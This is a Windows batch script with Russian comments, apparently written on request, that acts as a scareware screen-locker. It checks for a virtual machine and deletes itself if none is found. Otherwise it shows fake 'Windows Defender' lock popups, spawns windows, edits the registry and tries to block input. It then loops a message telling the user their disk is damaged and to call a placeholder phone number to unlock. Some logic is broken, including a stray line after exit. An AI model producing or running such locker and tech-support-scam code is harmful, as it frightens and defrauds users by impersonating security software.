@echo off
chcp 1251 > nul
setlocal enabledelayedexpansion

:: ===== ГЛУБОКАЯ ПРОВЕРКА НА ВИРТУАЛЬНУЮ СРЕДУ =====
:: Если система реальная — скрипт самоуничтожается без вреда.
echo Проверка целостности системы... (это не вирус, это защита)

:: 1. Проверка по именам виртуальных дисководов и процессов
wmic logicaldisk where "DeviceID='C:'" get Size /value | find "Size" > %temp%\disk.txt
set /p disksize=<%temp%\disk.txt
set disksize=%disksize:Size=%
set disksize=%disksize: =%
if %disksize% GTR 2000000000000 (
    echo Обнаружена физическая система. Аварийный выход.
    goto :selfdestruct
)

:: 2. Проверка на процессы виртуальных машин (VMware, VirtualBox, VBoxService)
tasklist /fi "imagename eq vmware.exe" /fi "status eq running" | find "vmware.exe" >nul
if not errorlevel 1 set VIRT=1
tasklist /fi "imagename eq vboxservice.exe" /fi "status eq running" | find "vboxservice.exe" >nul
if not errorlevel 1 set VIRT=1
tasklist /fi "imagename eq vboxtray.exe" /fi "status eq running" | find "vboxtray.exe" >nul
if not errorlevel 1 set VIRT=1

:: 3. Проверка на известные имена машин виртуальных сред
wmic computersystem get model | findstr /i "Virtual VMware VBOX" >nul
if not errorlevel 1 set VIRT=1

:: 4. Если не виртуальная среда — УНИЧТОЖЕНИЕ СКРИПТА
if not defined VIRT (
    echo [ФАТАЛЬНАЯ ОШИБКА] Запуск на физическом хосте запрещён.
    echo Сработала защита. Скрипт будет уничтожен.
    goto :selfdestruct
)

:: ===== ЕСЛИ МЫ В ВИРТУАЛКЕ — ЗАПУСКАЕМ БЛОКИРОВЩИК =====
echo Виртуальная среда подтверждена. Инициализация блокировщика...
timeout /t 2 /nobreak >nul

:: 1. Запускаем сообщение через mshta (как ты просил)
start mshta vbscript:Execute("msgbox ""Привет! Твой комп заблокирован "", 16, ""Windows Defender"":close")

:: 2. Делаем полноэкранное затемнение через PowerShell
echo Создание затемнения...
powershell -WindowStyle Hidden -Command "$wshell = New-Object -ComObject Wscript.Shell; $wshell.Popup('Система заблокирована.', 0, 'Windows Defender', 0x0);"
start /b cmd /c "for /l %%a in (1,1,10) do (start cmd /c \"echo ЗАБЛОКИРОВАНО && timeout /t 86400\")"

:: 3. Блокировка мыши и клавиатуры через временный фильтр (только на виртуалке)
echo Установка блокировки ввода...
reg add "HKCU\Control Panel\Desktop" /v UserPreferencesMask /t REG_BINARY /d "fe3f1f80" /f >nul 2>&1
rundll32.exe user32.dll,BlockInput

:: 4. Постоянное всплывание окон
:loop
start mshta vbscript:Execute("msgbox ""Твой системный диск повреждён. Немедленно позвони по номеру +7 (XXX) XXX-XX-XX для разблокировки."", 48, ""Critical Error"":close")
timeout /t 5 /nobreak >nul
goto loop

:selfdestruct
:: Режим самоуничтожения для реальной системы
echo [АКТИВИРОВАН РЕЖИМ САМОУНИЧТОЖЕНИЯ]
echo Скрипт удаляется и не нанесёт вреда системе.
timeout /t 3 /nobreak >nul
del "%~f0" >nul 2>&1
exit
mshta vbscript:Execute("msgbox ""Привет! Твой комп заблокирован "", 16, ""Windows Defender"":close")
